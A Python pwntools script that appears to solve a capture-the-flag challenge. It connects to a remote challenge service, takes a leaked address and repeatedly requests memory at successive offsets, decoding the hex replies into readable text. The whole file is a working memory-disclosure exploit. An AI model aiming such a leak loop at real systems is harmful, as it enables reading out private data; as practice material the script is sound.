#!/usr/bin/env python

from pwn import *
from string import printable

def nextMem(addr: bytes) -> bytes:
    return str(hex(int(addr, 16)+8)).encode()

io = remote("pymemwarmup.ept.gg", 1337, ssl=True)

io.recvuntil(b'id=')
addr = io.recvline().strip()
addr = str(hex(int(addr, 16))).encode()

result = []

for _ in range(50):
    addr = nextMem(addr)
    io.sendlineafter(b': ', addr)
    string = bytes.fromhex(io.recvline().strip()[20:].decode())
    result.extend([chr(c) for c in string if chr(c) in printable])

output = ''.join(result)
print(output)

io.close()
